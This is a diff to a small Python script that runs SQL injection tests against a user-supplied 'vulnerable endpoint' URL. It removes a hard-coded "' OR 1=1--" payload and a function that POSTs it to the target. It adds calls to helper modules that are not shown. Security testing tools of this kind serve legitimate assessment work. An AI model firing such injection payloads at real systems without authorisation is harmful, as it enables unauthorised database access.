@@ -1,11 +1,6 @@
-import requests
 import argparse
-
-# Function to send SQL payloads and receive the response
-def send_payload(target_url, payload):
-    # Sends the payload to the target URL
-    response = requests.post(target_url, data={"input_field": payload})
-    return response.text
+from sql_tester import test_sql_injection
+from url_utils import extract_id
 
 if __name__ == "__main__":
     # Set up argument parsing
@@ -13,10 +8,12 @@ if __name__ == "__main__":
     parser.add_argument("target_url", help="The URL of the vulnerable endpoint to target")
     args = parser.parse_args()
 
-    # Use the target URL from the command line
+    # Extract the id value from the URL
     target_url = args.target_url
-    test_payload = "' OR 1=1--"
+    id_value = extract_id(target_url)
 
-    # Send a test payload and print the response
-    result = send_payload(target_url, test_payload)
-    print("Response from server:", result)
+    if id_value:
+        # Run the SQL injection tests
+        test_sql_injection(target_url, id_value)
+    else:
+        print("Error: No 'id' parameter found in the URL.")
